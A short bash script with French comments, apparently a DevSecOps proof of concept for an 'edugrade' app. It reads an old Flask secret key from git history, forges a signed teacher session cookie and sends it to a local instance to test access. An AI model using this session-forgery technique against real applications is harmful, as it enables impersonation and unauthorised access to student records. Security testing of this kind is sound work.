#!/usr/bin/env bash
# Forge un cookie de session enseignant avec l'ANCIENNE cle V3 (lue dans l'historique git) et l'envoie a l'application.
cd ~/Projects/edugrade-devsecops
OLD=$(git show f78fd00:app/config.py | grep -E '^SECRET_KEY' | cut -d'"' -f2)
echo "cle lue dans l'historique (commit f78fd00) : ****MASQUEE**** (${#OLD} caracteres)"
COOKIE=$(docker run --rm --entrypoint python -e K="$OLD" edugrade-backend:local -c '
import os; from flask import Flask; from flask.sessions import SecureCookieSessionInterface
a=Flask("x"); a.secret_key=os.environ["K"]
print(SecureCookieSessionInterface().get_signing_serializer(a).dumps({"user_id":1,"role":"teacher","name":"Claire Dubois"}))')
echo "cookie enseignant forge : ${COOKIE:0:12}...(tronque)"
echo "GET /teacher/students avec le cookie forge -> HTTP $(curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}' -b "edugrade_session=$COOKIE" localhost:8080/teacher/students)"
